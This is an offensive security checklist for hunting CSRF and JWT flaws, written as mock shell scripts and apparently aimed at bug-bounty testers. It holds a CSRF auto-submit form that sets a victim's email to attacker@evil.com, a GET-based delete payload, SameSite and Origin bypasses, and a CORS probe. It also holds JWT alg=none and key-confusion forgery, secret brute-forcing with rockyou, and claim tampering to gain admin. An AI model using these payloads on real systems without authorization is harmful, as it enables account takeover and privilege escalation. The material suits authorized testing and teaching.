üõ°Ô∏è CSRF Vulnerability Hunting Checklist

root@cybersec:~$ cat csrf_hunt.sh

üîç 1. Identify CSRF-Prone Endpoints

High-Value Targets:

  • Account Settings: /change_email, /update_profile
  • Password Management: /reset_password, /change_password
  • User Management: /admin/delete_user, /admin/add_user
  • Financial Actions: /wallet/transfer, /payment/send

Discovery Commands:

  • gau target.com | grep -Ei 'delete|update|change|admin'
  • Use Burp Spider to crawl forms and actions
  • Filter for POST/PUT/DELETE methods in Burp

üõ°Ô∏è 2. Check CSRF Protections

Protection Mechanisms:

  • CSRF Tokens: Look for csrf_token in request body/headers
  • SameSite Cookies: Check for SameSite=Strict/Lax
  • Origin/Referer: Header validation checks

Testing Commands:

  • curl -I https://target.com/login | grep -i set-cookie
  • Remove CSRF token and resend in Burp Repeater
  • Test without Origin/Referer headers

‚öîÔ∏è 3. Craft CSRF Exploit PoC

Auto-Submit Form:

  • <form action="target.com/change_email" method="POST">
  • <input type="hidden" name="email" value="attacker@evil.com">
  • document.getElementById("csrfForm").submit();

GET-based CSRF:

  • <img src="https://target.com/delete?id=123">
  • Works with SameSite=Lax cookies

üß† 4. Bypass SameSite/Origin Checks

SameSite Bypass Techniques:

  • GET Requests: <img> tags work with Lax
  • Top-level Navigation: Direct window.open() calls
  • Open Redirect Chain: Combine with redirect vulnerabilities

Origin Header Bypass:

  • Use <img> or <a> tags (don't send Origin)
  • Test referrerpolicy="no-referrer"

üîó 5. CORS + Cookie Misconfig Chain

Check for CORS Issues:

  • curl -H "Origin: https://attacker.com" target.com/api
  • Look for: Access-Control-Allow-Credentials: true
  • Wildcard CORS: Access-Control-Allow-Origin: *

Cookie Misconfigurations:

  • Missing SameSite attribute
  • SameSite=None without Secure flag
  • Cross-origin cookie sharing

root@cybersec:~$ cat jwt_hunt.sh
#!/bin/bash

üß≠ 1. JWT Recon & Discovery

Where to Find JWTs:

  • Headers: Authorization: Bearer <JWT>
  • Cookies: auth_token=<JWT>
  • Storage: localStorage.getItem("token")
  • URLs: /verify?token=<JWT>
  • JS Files: Hardcoded tokens or API usage

Discovery Commands:

  • gau target.com | grep -iE 'token|auth|jwt'
  • echo "eyJhbGci..." | cut -d "." -f2 | base64 -d
  • Search for "eyJ" prefix (JWT header base64)

üß™ 2. Manual Testing Techniques

Algorithm None Bypass:

  • Change header: {"alg": "none", "typ": "JWT"}
  • Remove signature part (everything after second dot)
  • python3 jwt_tool.py <jwt> -X alg=none

Key Confusion (RS256 ‚Üí HS256):

  • Change alg from RS256 to HS256
  • Sign with public key as HMAC secret
  • python3 jwt_tool.py <jwt> -S public.pem -X alg=HS256

Weak Secret Brute Force:

  • jwt-cracker -t <jwt> -w rockyou.txt
  • Common secrets: admin, secret, password, 123456

üõ† 3. JWT Automation Tools

jwt_tool.py (Essential):

  • git clone https://github.com/ticarpi/jwt_tool
  • Inspect: python3 jwt_tool.py <token> -I
  • Crack: python3 jwt_tool.py <token> -C -d -W rockyou.txt
  • Forge: python3 jwt_tool.py <token> -S secret

Other Tools:

  • npm install -g jwt-cracker
  • pip install pyjwt
  • Burp Extensions: JWT Editor, Authorizer

üîì 4. Common Vulnerable Scenarios

Claim Tampering:

  • Modify: {"role": "admin"}
  • Change: {"isAdmin": true}
  • Escalate: {"user_id": 1}

Time-based Bypasses:

  • Extend expiry: {"exp": 9999999999}
  • Remove exp claim entirely
  • Manipulate iat, nbf values

üî• 5. Advanced Payload Tricks

JSON Injection:

  • {"user":"admin\r\nrole:admin"}
  • Duplicate claims: {"role": "user", "role": "admin"}

Scope Escalation:

  • {"scope": "read write admin"}
  • OAuth-style privilege escalation

Null/Missing Claims:

  • {"role": null}
  • Remove critical validation claims
